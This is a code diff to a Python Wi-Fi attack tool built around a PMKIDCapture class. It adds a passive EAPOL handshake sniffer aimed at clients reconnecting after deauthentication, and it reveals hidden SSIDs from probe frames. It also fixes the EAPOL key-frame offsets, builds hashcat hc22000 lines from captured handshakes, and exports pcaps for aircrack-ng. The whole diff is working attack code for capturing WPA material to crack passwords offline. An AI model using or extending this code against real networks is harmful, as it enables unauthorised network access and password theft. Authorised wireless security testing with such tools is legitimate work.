@@ -28,7 +28,7 @@ from typing import Optional, Dict, List, Tuple
 
 try:
     from scapy.all import (
-        sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp,
+        sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp,
         Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11Deauth, Dot11Disas,
         RadioTap, EAPOL, Raw, conf, sendp, Ether,
         get_if_list, get_if_hwaddr
@@ -108,6 +108,11 @@ class PMKIDCapture:
         self.client_scanning = False
         self.client_scan_proc = None  # airodump-ng subprocess
         self.discovered_clients: List[Dict] = []  # [{mac, bssid, ssid, signal, vendor, ...}]
+
+        # Passive sniffer
+        self.sniffer_active = False
+        self.sniffer_thread = None
+        self.sniffer_interface = None
 
         # Detect available interfaces
         self.available_interfaces = self._detect_wifi_interfaces()
@@ -548,7 +553,7 @@ class PMKIDCapture:
         return networks
 
     def _process_beacon(self, packet):
-        """Process a beacon/probe response frame."""
+        """Process beacon, probe response, and probe request frames."""
         if not packet.haslayer(Dot11):
             return
 
@@ -566,10 +571,26 @@ class PMKIDCapture:
                 crypto = set()
                 channel = 0
 
-                stats = packet[Dot11Beacon].network_stats() if packet.haslayer(Dot11Beacon) else {}
-                ssid = stats.get("ssid", "")
-                channel = stats.get("channel", 0)
-                crypto = stats.get("crypto", set())
+                if packet.haslayer(Dot11Beacon):
+                    stats = packet[Dot11Beacon].network_stats()
+                    ssid = stats.get("ssid", "")
+                    channel = stats.get("channel", 0)
+                    crypto = stats.get("crypto", set())
+                elif packet.haslayer(Dot11ProbeResp):
+                    # Extract SSID from probe response Dot11Elt elements
+                    elt = packet[Dot11ProbeResp].payload
+                    while elt and isinstance(elt, Dot11Elt):
+                        if elt.ID == 0:  # SSID element
+                            try:
+                                ssid = elt.info.decode("utf-8", errors="ignore")
+                            except Exception:
+                                pass
+                        elif elt.ID == 3:  # DS Parameter Set (channel)
+                            try:
+                                channel = elt.info[0]
+                            except Exception:
+                                pass
+                        elt = elt.payload if elt.payload and isinstance(elt.payload, Dot11Elt) else None
 
                 if bssid not in self.networks:
                     enc_str = "/".join(crypto) if crypto else "Open"
@@ -579,16 +600,46 @@ class PMKIDCapture:
                         channel=channel,
                         encryption=enc_str,
                     )
-                    # Try to get signal strength from RadioTap
                     if packet.haslayer(RadioTap):
                         try:
                             self.networks[bssid].signal = packet[RadioTap].dBm_AntSignal
                         except (AttributeError, TypeError):
                             pass
 
+                # Update hidden SSID if we now have the real name
+                elif ssid and self.networks[bssid].ssid == "<Hidden>":
+                    self.networks[bssid].ssid = ssid
+                    self._log("warning",
+                              f"Hidden SSID revealed: {bssid} -> '{ssid}'")
+
                 self.networks[bssid].last_seen = datetime.now().isoformat()
                 self.networks[bssid].beacon_count += 1
 
+            except Exception:
+                pass
+
+        # Probe requests from clients reveal hidden SSIDs
+        if packet.haslayer(Dot11ProbeReq):
+            try:
+                elt = packet[Dot11ProbeReq].payload
+                ssid = ""
+                while elt and isinstance(elt, Dot11Elt):
+                    if elt.ID == 0 and elt.info:
+                        try:
+                            ssid = elt.info.decode("utf-8", errors="ignore")
+                        except Exception:
+                            pass
+                        break
+                    elt = elt.payload if elt.payload and isinstance(elt.payload, Dot11Elt) else None
+
+                if ssid:
+                    # Check if any hidden network matches this client's AP
+                    client_mac = packet[Dot11].addr2
+                    for bssid, net in self.networks.items():
+                        if net.ssid == "<Hidden>" and client_mac in net.clients:
+                            net.ssid = ssid
+                            self._log("warning",
+                                      f"Hidden SSID revealed via probe: {bssid} -> '{ssid}'")
             except Exception:
                 pass
 
@@ -1688,6 +1739,59 @@ class PMKIDCapture:
         self.running = False
         self._log("info", "Capture stopped by user")
 
+    # ─── Passive Sniffer ─────────────────────────────────────────────
+
+    def start_sniffer(self, interface: str, channel: int = None,
+                      bssid: str = None) -> bool:
+        """
+        Start a passive EAPOL sniffer on the monitor-mode interface.
+        Captures handshakes from clients reconnecting (e.g. after deauth).
+        Runs independently of the active PMKID capture.
+        """
+        if self.sniffer_active:
+            self._log("warning", "Sniffer already running")
+            return False
+
+        # Resolve channel from bssid if not provided
+        if not channel and bssid and bssid in self.networks:
+            channel = self.networks[bssid].channel
+
+        if channel and channel > 0:
+            self.set_channel(interface, channel)
+            time.sleep(0.3)
+
+        self.sniffer_active = True
+        self.sniffer_interface = interface
+
+        ch_info = f"channel {channel}" if channel else "all channels"
+        self._log("info", f"Passive sniffer started on {interface} ({ch_info})")
+
+        def _sniffer_loop():
+            try:
+                sniff(
+                    iface=interface,
+                    prn=self._process_capture_packet,
+                    stop_filter=lambda pkt: not self.sniffer_active,
+                    store=0,
+                )
+            except Exception as e:
+                self._log("error", f"Sniffer error: {e}")
+            finally:
+                self.sniffer_active = False
+                self._log("info", "Passive sniffer stopped")
+
+        self.sniffer_thread = threading.Thread(
+            target=_sniffer_loop, daemon=True
+        )
+        self.sniffer_thread.start()
+        return True
+
+    def stop_sniffer(self):
+        """Stop the passive sniffer."""
+        if self.sniffer_active:
+            self.sniffer_active = False
+            self._log("info", "Sniffer stop requested")
+
     def _process_capture_packet(self, packet):
         """Process a packet during PMKID capture."""
         self.packet_count += 1
@@ -1743,16 +1847,17 @@ class PMKIDCapture:
                 return
 
             # Parse EAPOL key frame
-            # Byte 1: descriptor type (should be 2 for RSN)
-            # Bytes 2-3: key info
-            # Bytes 4-5: key length
-            key_info = struct.unpack("!H", raw_data[1:3])[0] if len(raw_data) > 3 else 0
+            # EAPOL header: version(1) + type(1) + length(2) = 4 bytes
+            # Then EAPOL-Key body:
+            #   Byte 4: Key Descriptor Type (2 = RSN)
+            #   Bytes 5-6: Key Information
+            #   Bytes 7-8: Key Length
+            key_info = struct.unpack("!H", raw_data[5:7])[0] if len(raw_data) > 7 else 0
 
-            # Key info bits:
-            # Bit 3: Install
-            # Bit 6: Key ACK
-            # Bit 7: Key MIC
-            # Bit 8: Secure
+            # Key info bits (per IEEE 802.11i):
+            # Bit 6: Install
+            # Bit 7: Key ACK
+            # Bit 8: Key MIC
             has_ack = bool(key_info & (1 << 7))
             has_mic = bool(key_info & (1 << 8))
             is_install = bool(key_info & (1 << 6))
@@ -1824,13 +1929,37 @@ class PMKIDCapture:
                     self._log("warning",
                                f"PMKID CAPTURED from {bssid} ({ssid})!")
 
-            # Check if we have a complete handshake (messages 1+2 or 2+3)
+            # Check if we have a complete handshake (messages 1+2)
             if bssid in self.eapol_frames:
                 frames = self.eapol_frames[bssid]
                 if 1 in frames and 2 in frames:
                     ssid = ""
                     if bssid in self.networks:
                         ssid = self.networks[bssid].ssid
+
+                    # Extract ANonce from Message 1 (offset 17-48 in raw EAPOL)
+                    msg1_raw = bytes.fromhex(frames[1]["raw"])
+                    msg2_raw = bytes.fromhex(frames[2]["raw"])
+                    anonce = msg1_raw[17:49].hex() if len(msg1_raw) >= 49 else ""
+
+                    # Extract MIC from Message 2 (offset 81-97)
+                    mic = msg2_raw[81:97].hex() if len(msg2_raw) >= 97 else ""
+
+                    # Build Message 2 EAPOL with MIC zeroed for hashcat
+                    msg2_zeroed = bytearray(msg2_raw)
+                    if len(msg2_zeroed) >= 97:
+                        msg2_zeroed[81:97] = b'\x00' * 16
+                    eapol_m2 = msg2_zeroed.hex()
+
+                    # Format hashcat hc22000 line (WPA*02*)
+                    mac_ap_clean = frames[1]["mac_ap"].replace(":", "").lower()
+                    mac_cl_clean = frames[1]["mac_client"].replace(":", "").lower()
+                    ssid_hex = ssid.encode("utf-8").hex() if ssid else ""
+                    # Message pair: 0 = M1+M2 (most common)
+                    hashcat_line = (
+                        f"WPA*02*{mic}*{mac_ap_clean}*{mac_cl_clean}"
+                        f"*{ssid_hex}*{anonce}*{eapol_m2}*00"
+                    )
 
                     handshake = {
                         "bssid": bssid,
@@ -1839,6 +1968,11 @@ class PMKIDCapture:
                         "mac_client": frames[1]["mac_client"],
                         "messages": list(frames.keys()),
                         "timestamp": datetime.now().isoformat(),
+                        "anonce": anonce,
+                        "mic": mic,
+                        "hashcat_line": hashcat_line,
+                        "eapol_msg1": frames[1]["raw"],
+                        "eapol_msg2": frames[2]["raw"],
                     }
 
                     # Check if this handshake is already captured
@@ -1870,17 +2004,20 @@ class PMKIDCapture:
           +-- Tag: 0xdd (vendor specific)
         """
         try:
-            # Key Data Length is at offset 95-96 (2 bytes, big-endian)
-            if len(eapol_data) < 97:
+            # EAPOL header (4 bytes) + Key Descriptor Type (1) + Key Info (2) +
+            # Key Length (2) + Replay Counter (8) + Key Nonce (32) +
+            # Key IV (16) + Key RSC (8) + Key ID (8) + Key MIC (16) = 97
+            # Key Data Length is at offset 97-98
+            if len(eapol_data) < 99:
                 return None
 
-            key_data_len = struct.unpack("!H", eapol_data[95:97])[0]
+            key_data_len = struct.unpack("!H", eapol_data[97:99])[0]
 
             if key_data_len == 0:
                 return None
 
-            # Key Data starts at offset 97
-            key_data = eapol_data[97:97 + key_data_len]
+            # Key Data starts at offset 99
+            key_data = eapol_data[99:99 + key_data_len]
 
             # Search for PMKID KDE: dd 14 00 0f ac 04
             pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
@@ -1934,6 +2071,7 @@ class PMKIDCapture:
                 "pmkids_captured": len(self.captured_pmkids),
                 "handshakes_captured": len(self.captured_handshakes),
                 "networks_seen": len(self.networks),
+                "sniffer_active": self.sniffer_active,
             }
 
     def get_results(self) -> Dict:
@@ -1963,6 +2101,148 @@ class PMKIDCapture:
             return filepath
 
         return ""
+
+    def export_handshakes(self, indices: List[int] = None,
+                          fmt: str = "pcap") -> List[str]:
+        """
+        Export captured handshakes as individual files.
+
+        Args:
+            indices: List of handshake indices to export, or None for all.
+            fmt: Export format - "pcap" (for aircrack-ng) or "hc22000" (for hashcat).
+
+        Returns:
+            List of exported file paths.
+        """
+        with self.lock:
+            handshakes = list(self.captured_handshakes)
+
+        if not handshakes:
+            return []
+
+        if indices is not None:
+            handshakes = [
+                handshakes[i] for i in indices
+                if 0 <= i < len(self.captured_handshakes)
+            ]
+
+        exported = []
+        os.makedirs("data", exist_ok=True)
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        for i, hs in enumerate(handshakes):
+            # Clean SSID for filename
+            ssid_safe = "".join(
+                c if c.isalnum() or c in "-_" else "_"
+                for c in (hs.get("ssid") or "unknown")
+            )
+            bssid_safe = hs["bssid"].replace(":", "")
+            base = f"data/handshake_{ssid_safe}_{bssid_safe}_{timestamp}_{i}"
+
+            if fmt == "hc22000":
+                hashcat_line = hs.get("hashcat_line", "")
+                if not hashcat_line:
+                    continue
+                filename = f"{base}.hc22000"
+                with open(filename, "w") as f:
+                    f.write(hashcat_line + "\n")
+                exported.append(filename)
+
+            else:  # pcap
+                filename = f"{base}.cap"
+                pcap_path = self._build_pcap(hs, filename)
+                if pcap_path:
+                    exported.append(pcap_path)
+
+            self._log("info", f"Exported handshake to {exported[-1] if exported else filename}")
+
+        return exported
+
+    def _build_pcap(self, hs: Dict, filepath: str) -> Optional[str]:
+        """
+        Build a pcap file from captured handshake EAPOL frames.
+        Creates a minimal pcap with a beacon + EAPOL Message 1 + Message 2.
+        Compatible with aircrack-ng.
+        """
+        if not SCAPY_AVAILABLE:
+            self._log("error", "Scapy required for pcap export")
+            return None
+
+        try:
+            from scapy.all import wrpcap, LLC, SNAP
+
+            mac_ap = hs["mac_ap"]
+            mac_client = hs["mac_client"]
+            ssid = hs.get("ssid", "")
+            bssid = hs["bssid"]
+            msg1_raw = bytes.fromhex(hs.get("eapol_msg1", ""))
+            msg2_raw = bytes.fromhex(hs.get("eapol_msg2", ""))
+
+            if not msg1_raw or not msg2_raw:
+                self._log("error", "Missing raw EAPOL data for pcap export")
+                return None
+
+            packets = []
+
+            # Beacon frame with SSID (so aircrack-ng knows the network name)
+            beacon = (
+                RadioTap() /
+                Dot11(
+                    type=0, subtype=8,
+                    addr1="ff:ff:ff:ff:ff:ff",
+                    addr2=mac_ap,
+                    addr3=mac_ap,
+                ) /
+                Dot11Beacon(cap=0x1111) /
+                Dot11Elt(ID=0, info=ssid.encode("utf-8")) /
+                Dot11Elt(ID=1, info=bytes([0x82, 0x84, 0x8b, 0x96])) /
+                Dot11Elt(ID=48, info=bytes([
+                    0x01, 0x00, 0x00, 0x0f, 0xac, 0x04,
+                    0x01, 0x00, 0x00, 0x0f, 0xac, 0x04,
+                    0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,
+                    0x00, 0x00,
+                ]))
+            )
+            packets.append(beacon)
+
+            # EAPOL Message 1: AP -> Client (plain Data frame, From-DS)
+            eapol1 = (
+                RadioTap() /
+                Dot11(
+                    type=2, subtype=0,
+                    FCfield=0x02,  # From-DS
+                    addr1=mac_client,
+                    addr2=mac_ap,
+                    addr3=mac_ap,
+                ) /
+                LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
+                SNAP(OUI=0, code=0x888e) /
+                Raw(load=msg1_raw)
+            )
+            packets.append(eapol1)
+
+            # EAPOL Message 2: Client -> AP (plain Data frame, To-DS)
+            eapol2 = (
+                RadioTap() /
+                Dot11(
+                    type=2, subtype=0,
+                    FCfield=0x01,  # To-DS
+                    addr1=mac_ap,
+                    addr2=mac_client,
+                    addr3=mac_ap,
+                ) /
+                LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
+                SNAP(OUI=0, code=0x888e) /
+                Raw(load=msg2_raw)
+            )
+            packets.append(eapol2)
+
+            wrpcap(filepath, packets)
+            return filepath
+
+        except Exception as e:
+            self._log("error", f"Pcap export error: {e}")
+            return None
 
     def get_log(self, n: int = 50) -> List[Dict]:
         """Get recent log entries."""
